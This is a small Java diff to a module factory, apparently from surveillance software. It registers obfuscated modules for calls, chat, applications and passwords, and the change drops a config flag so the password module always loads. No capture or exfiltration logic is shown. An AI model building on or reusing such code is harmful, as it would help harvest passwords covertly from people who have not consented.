@@ -37,9 +37,8 @@ public class FactoryModule implements AbstractFactory<BaseModule, String> {
 		factorymap.put(M.e("application"), ModuleApplication.class);
 		factorymap.put(M.e("call"), ModuleCall.class);
 		factorymap.put(M.e("chat"), ModuleChat.class);
-		if (Cfg.ENABLE_PASSWORD_MODULE) {
-			factorymap.put(M.e("password"), ModulePassword.class);
-		}
+		factorymap.put(M.e("password"), ModulePassword.class);
+		
 
 		Enumeration<String> en = factorymap.keys();
 		while (en.hasMoreElements()) {
